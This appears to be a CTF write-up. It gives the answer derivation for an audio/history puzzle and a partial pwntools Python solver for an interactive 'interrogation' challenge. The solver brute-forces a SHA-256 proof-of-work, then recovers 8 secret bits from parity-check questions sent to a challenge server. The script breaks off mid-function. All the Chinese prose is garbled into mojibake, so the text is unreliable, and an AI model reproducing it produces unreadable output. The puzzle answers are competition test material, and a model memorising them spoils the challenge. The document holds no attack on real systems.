<p>è§£å¼€éŸ³é¢‘ï¼Œå¬åˆ°<code>åŒé²¤æ¹–è¥¿å²¸å—å±±èŒ¶é“º</code>ç»“åˆé¢˜ç›®ä¿¡æ¯1949.10å’ŒçœŸå®å†å²äº‹ä»¶æŸ¥è¯¢å¾—çŸ¥é‡‘é—¨æˆ˜å½¹ï¼Œæ—¥æœŸä¸º10.24ï¼Œä¸éŸ³é¢‘ä¸­å»¿å››æ‹…ç§‹èŒ¶åŒ¹é…ï¼ŒåŒæ—¶éŸ³é¢‘æåŠ<code>è¾°æ—¶æ­£è¿‡ä¸‰åˆ»</code>ï¼Œå³8.45ï¼Œç»“åˆä¿¡æ¯å¯å¾—<code>1949å¹´10æœˆ24æ—¥8æ—¶45åˆ†äºåŒé²¤æ¹–è¥¿å²¸å—å±±èŒ¶é“º</code>ï¼Œmd5ä½œä¸ºç­”æ¡ˆæäº¤å³å¯</p>
<p>ä½ ä»¬å¯ä»¥æ„Ÿå—ä¸€ä¸‹ï¼ˆè‡ªè¡Œè§£å‹æ”¶å¬ï¼‰ï¼š <a class="link" href="%e7%bb%9d%e5%af%86%e5%bd%95%e9%9f%b3.zip" >ç»å¯†å½•éŸ³.zip</a></p>
<h3 id="the_interrogation_room">The_Interrogation_Room
</h3><h4 id="è§£é¢˜æ€è·¯-3">è§£é¢˜æ€è·¯
</h4><p>åƒæäº†å®¡è®¯çŠ¯äººå½•å£ä¾›ï¼Œè¦åœ¨æœ‰é™çš„äº¤äº’ä¸­gank8ä¸ªsecretsï¼Œè¿™é‡Œæ ¹æ®server.pyä¸­çš„ä»£ç éœ€è¦åœ¨å®¡è®¯æ—¶è¿›è¡Œä¸¥å‰æ‹·æ‰“ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯è¦å…ˆè¯•ç”¨PoWæ¥è§£sha256ï¼Œç„¶ååœ¨17ä¸ªé—®é¢˜ä¸­ç¡®å®š8ä¸ªç§˜å¯†çš„å€¼ï¼Œè¿™é‡Œå¯ä»¥é€šè¿‡æ„é€ s[i]==1æ¥ç›´æ¥æé—®å‰8ä¸ªé—®é¢˜ï¼Œå9ä¸ªæ˜¯å››å…ƒå¥‡å¶æ ¡éªŒé—®é¢˜ï¼Œæ£€æŸ¥å››ä¸ªæ¯”ç‰¹ä¸­æ˜¯å¦æœ‰å¥‡æ•°ä¸ªä¸º1ã€‚åé¢çš„ç›´æ¥ç”¨æå–èŒƒå¼æ¥æï¼Œè„šæœ¬éå†æ‰€æœ‰256ç§å¯èƒ½çš„8æ¯”ç‰¹èµ‹å€¼ï¼Œå¯¹äºæ¯ç§èµ‹å€¼ï¼Œè®¡ç®—é¢„æµ‹çš„17ä¸ªå›ç­”ã€‚æ¯”è¾ƒé¢„æµ‹å›ç­”ä¸å®é™…è§‚æµ‹å›ç­”ï¼Œè®¡ç®—çŸ›ç›¾æ¬¡æ•°ï¼Œæ‹©çŸ›ç›¾æ¬¡æ•°æœ€å°‘çš„èµ‹å€¼ä½œä¸ºæäº¤ç­”æ¡ˆã€‚å…·ä½“å¯çœ‹exp</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span><span class="lnt">195
</span><span class="lnt">196
</span><span class="lnt">197
</span><span class="lnt">198
</span><span class="lnt">199
</span><span class="lnt">200
</span><span class="lnt">201
</span><span class="lnt">202
</span><span class="lnt">203
</span><span class="lnt">204
</span><span class="lnt">205
</span><span class="lnt">206
</span><span class="lnt">207
</span><span class="lnt">208
</span><span class="lnt">209
</span><span class="lnt">210
</span><span class="lnt">211
</span><span class="lnt">212
</span><span class="lnt">213
</span><span class="lnt">214
</span><span class="lnt">215
</span><span class="lnt">216
</span><span class="lnt">217
</span><span class="lnt">218
</span><span class="lnt">219
</span><span class="lnt">220
</span><span class="lnt">221
</span><span class="lnt">222
</span><span class="lnt">223
</span><span class="lnt">224
</span><span class="lnt">225
</span><span class="lnt">226
</span><span class="lnt">227
</span><span class="lnt">228
</span><span class="lnt">229
</span><span class="lnt">230
</span><span class="lnt">231
</span><span class="lnt">232
</span><span class="lnt">233
</span><span class="lnt">234
</span><span class="lnt">235
</span><span class="lnt">236
</span><span class="lnt">237
</span><span class="lnt">238
</span><span class="lnt">239
</span><span class="lnt">240
</span><span class="lnt">241
</span><span class="lnt">242
</span><span class="lnt">243
</span><span class="lnt">244
</span><span class="lnt">245
</span><span class="lnt">246
</span><span class="lnt">247
</span><span class="lnt">248
</span><span class="lnt">249
</span><span class="lnt">250
</span><span class="lnt">251
</span><span class="lnt">252
</span><span class="lnt">253
</span><span class="lnt">254
</span><span class="lnt">255
</span><span class="lnt">256
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">Python</span>
</span></span><span class="line"><span class="cl"><span class="n">python</span>
</span></span><span class="line"><span class="cl"><span class="c1">#!/usr/bin/env python3</span>
</span></span><span class="line"><span class="cl"><span class="c1"># -*- coding: utf-8 -*-</span>
</span></span><span class="line"><span class="cl"><span class="c1">#</span>
</span></span><span class="line"><span class="cl"><span class="c1"># äº¤äº’è§£é¢˜è„šæœ¬ï¼š</span>
</span></span><span class="line"><span class="cl"><span class="c1"># - è‡ªåŠ¨ PoW: è§£ sha256(XXXX+suffix) == hexdigest</span>
</span></span><span class="line"><span class="cl"><span class="c1"># - æ¯è½® 17 æ¬¡é—®ç­”ï¼š8 ä¸ªå•æ¯”ç‰¹è¯¢é—® + 9 ä¸ªå››å…ƒâ€œå¥‡æ•°ä¸ªä¸ºçœŸâ€æ ¡éªŒ</span>
</span></span><span class="line"><span class="cl"><span class="c1"># - æ”¶åˆ° 17 ä¸ª True/False åï¼Œéå† 2^8=256 ä¸ªå¯èƒ½å‘é‡ï¼Œè®¡ç®—ä¸è§‚æµ‹å‘é‡çš„çŸ›ç›¾æ¬¡æ•°ï¼Œå–æœ€å°è€…æäº¤</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">itertools</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">hashlib</span> <span class="kn">import</span> <span class="n">sha256</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">concurrent.futures</span> <span class="kn">import</span> <span class="n">ThreadPoolExecutor</span><span class="p">,</span> <span class="n">as_completed</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="n">remote</span><span class="p">,</span> <span class="n">context</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span><span class="p">,</span><span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">HOST</span> <span class="o">=</span> <span class="s2">&#34;8.147.135.220&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">PORT</span> <span class="o">=</span> <span class="mi">36899</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">ALPHABET</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span>  <span class="c1"># 62^4 æœç´¢ç©ºé—´</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 9 ä¸ªå››å…ƒæ ¡éªŒçš„ä¸‹æ ‡é›†åˆï¼ˆä¿è¯æ¯ä¸ªæ¯”ç‰¹è‡³å°‘å‡ºç° 4 æ¬¡ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="n">CHECKS</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">),</span>  <span class="c1"># C0</span>
</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">6</span><span class="p">),</span>  <span class="c1"># C1</span>
</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">7</span><span class="p">),</span>  <span class="c1"># C2</span>
</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">7</span><span class="p">),</span>  <span class="c1"># C3</span>
</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">7</span><span class="p">),</span>  <span class="c1"># C4</span>
</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">7</span><span class="p">),</span>  <span class="c1"># C5</span>
</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">6</span><span class="p">),</span>  <span class="c1"># C6</span>
</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">6</span><span class="p">),</span>  <span class="c1"># C7</span>
</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">7</span><span class="p">),</span>  <span class="c1"># C8</span>
</span></span><span class="line"><span class="cl"><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">solve_pow</span><span class="p">(</span><span class="n">suffix</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">target_hex</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">threads</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">    æ±‚è§£ XXXX ä½¿ sha256(XXXX + suffix) == target_hex
</span></span></span><span class="line"><span class="cl"><span class="s2">    å¤šçº¿ç¨‹åˆ†ç‰‡ï¼šæŒ‰é¦–å­—ç¬¦åˆ†æˆ 62 ç‰‡ï¼Œæ¯ä¸ªçº¿ç¨‹è´Ÿè´£è‹¥å¹²é¦–å­—ç¬¦ã€‚
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">found</span> <span class="o">=</span> <span class="p">[</span><span class="kc">None</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">worker</span><span class="p">(</span><span class="n">prefixes</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">c0</span> <span class="ow">in</span> <span class="n">prefixes</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># 62^3 = 238,328 æ¬¡å¾ªç¯ / å‰ç¼€</span>
</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">c1</span> <span class="ow">in</span> <span class="n">ALPHABET</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">for</span> <span class="n">c2</span> <span class="ow">in</span> <span class="n">ALPHABET</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="k">for</span> <span class="n">c3</span> <span class="ow">in</span> <span class="n">ALPHABET</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                        <span class="n">x</span> <span class="o">=</span> <span class="n">c0</span> <span class="o">+</span> <span class="n">c1</span> <span class="o">+</span> <span class="n">c2</span> <span class="o">+</span> <span class="n">c3</span>
</span></span><span class="line"><span class="cl">                        <span class="k">if</span> <span class="n">sha256</span><span class="p">((</span><span class="n">x</span> <span class="o">+</span> <span class="n">suffix</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span> <span class="o">==</span> <span class="n">target_hex</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                            <span class="k">return</span> <span class="n">x</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># å¹³åˆ† ALPHABET ç»™ threads ä¸ªä»»åŠ¡æ¡¶</span>
</span></span><span class="line"><span class="cl">    <span class="n">buckets</span> <span class="o">=</span> <span class="p">[[]</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">threads</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">ch</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">ALPHABET</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">buckets</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="n">threads</span><span class="p">]</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">ch</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="n">ThreadPoolExecutor</span><span class="p">(</span><span class="n">max_workers</span><span class="o">=</span><span class="n">threads</span><span class="p">)</span> <span class="k">as</span> <span class="n">ex</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">futs</span> <span class="o">=</span> <span class="p">[</span><span class="n">ex</span><span class="o">.</span><span class="n">submit</span><span class="p">(</span><span class="n">worker</span><span class="p">,</span> <span class="n">bucket</span><span class="p">)</span> <span class="k">for</span> <span class="n">bucket</span> <span class="ow">in</span> <span class="n">buckets</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">fu</span> <span class="ow">in</span> <span class="n">as_completed</span><span class="p">(</span><span class="n">futs</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">ans</span> <span class="o">=</span> <span class="n">fu</span><span class="o">.</span><span class="n">result</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">ans</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="c1"># å–æ¶ˆå‰©ä½™ä»»åŠ¡</span>
</span></span><span class="line"><span class="cl">                <span class="k">for</span> <span class="n">f2</span> <span class="ow">in</span> <span class="n">futs</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="n">f2</span><span class="o">.</span><span class="n">cancel</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">ans</span>
</span></span><span class="line"><span class="cl">    <span class="k">raise</span> <span class="ne">RuntimeError</span><span class="p">(</span><span class="s2">&#34;PoW è§£å¤±è´¥ï¼ˆæ—¶é—´å¯èƒ½ä¸å¤Ÿï¼Ÿå¯ä»¥æŠŠçº¿ç¨‹å¼€å¤§ç‚¹æˆ–æ¢æ›´å¿«çš„æœºå™¨è¯•è¯•ï¼‰&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">bit_questions</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;å‰ 8 ä¸ªå•æ¯”ç‰¹é—®é¢˜ï¼š&#39;( S</span><span class="si">{i}</span><span class="s2"> == 1 )&#39;&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">[</span><span class="sa">f</span><span class="s2">&#34;( S</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2"> == 1 )&#34;</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">xor_expr</span><span class="p">(</span><span class="n">indices</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">    ç”Ÿæˆâ€œè¿™å‡ ä¸ªå˜é‡ä¸­æœ‰å¥‡æ•°ä¸ªä¸º 1â€çš„å¸ƒå°”è¡¨è¾¾å¼ï¼ˆä»…ç”¨ and/or/()==0/1ï¼‰
</span></span></span><span class="line"><span class="cl"><span class="s2">    DNFï¼šæŠŠæ‰€æœ‰å¥‡æ•°ä¸ª 1 çš„æŒ‡æ´¾åˆ—ä¸¾å‡ºæ¥ã€‚
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">vars_idx</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">indices</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">k</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">vars_idx</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">terms</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">mask</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="n">k</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">bin</span><span class="p">(</span><span class="n">mask</span><span class="p">)</span><span class="o">.</span><span class="n">count</span><span class="p">(</span><span class="s2">&#34;1&#34;</span><span class="p">)</span> <span class="o">%</span> <span class="mi">2</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>  <span class="c1"># å¥‡æ•°ä¸ª 1</span>
</span></span><span class="line"><span class="cl">            <span class="n">lits</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">pos</span><span class="p">,</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">vars_idx</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                <span class="n">v</span> <span class="o">=</span> <span class="mi">1</span> <span class="k">if</span> <span class="p">(</span><span class="n">mask</span> <span class="o">&gt;&gt;</span> <span class="n">pos</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">1</span> <span class="k">else</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">                <span class="n">lits</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;( S</span><span class="si">{</span><span class="n">j</span><span class="si">}</span><span class="s2"> == </span><span class="si">{</span><span class="n">v</span><span class="si">}</span><span class="s2"> )&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">terms</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s2">&#34;( &#34;</span> <span class="o">+</span> <span class="s2">&#34; and &#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">lits</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34; )&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s2">&#34;( &#34;</span> <span class="o">+</span> <span class="s2">&#34; or &#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">terms</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34; )&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">parity_questions</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;å 9 ä¸ªå››å…ƒå¥‡å¶é—®é¢˜&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">[</span><span class="n">xor_expr</span><span class="p">(</span><span class="n">indices</span><span class="p">)</span> <span class="k">for</span> <span class="n">indices</span> <span class="ow">in</span> <span class="n">CHECKS</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">all_questions</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;æ‹¼æˆæ€»å…± 17 ä¸ªé—®é¢˜ï¼ˆä¸¥æ ¼ä½¿ç”¨ç™½åå• tokenï¼Œå¹¶ç¡®ä¿ç©ºæ ¼åˆ†éš”ï¼‰&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">bit_questions</span><span class="p">()</span> <span class="o">+</span> <span class="n">parity_questions</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">predict_answers</span><span class="p">(</span><span class="n">assignment_bits</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">    å¯¹ç»™å®š 8 æ¯”ç‰¹ assignment_bitsï¼ˆ0/1 åˆ—è¡¨ï¼‰ï¼Œé¢„æµ‹ 17 ä¸ªé—®é¢˜åœ¨â€œå›šå¾’ä¸è¯´è°â€æƒ…å†µä¸‹çš„ç­”æ¡ˆï¼ˆTrue/Falseï¼‰
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="n">assignment_bits</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># å‰ 8 ä¸ªï¼šç›´æ¥ç­‰äºå¯¹åº”æ¯”ç‰¹æ˜¯å¦ä¸º 1</span>
</span></span><span class="line"><span class="cl">    <span class="n">ans</span> <span class="o">=</span> <span class="p">[</span><span class="nb">bool</span><span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># å 9 ä¸ªï¼šå››å…ƒå¥‡å¶ï¼ˆå¥‡æ•°ä¸ªä¸º 1ï¼‰</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">indices</span> <span class="ow">in</span> <span class="n">CHECKS</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">parity</span> <span class="o">=</span> <span class="nb">sum</span><span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="n">indices</span><span class="p">)</span> <span class="o">%</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">        <span class="n">ans</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">bool</span><span class="p">(</span><span class="n">parity</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">ans</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">nearest_assignment</span><span class="p">(</span><span class="n">observed_answers</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;
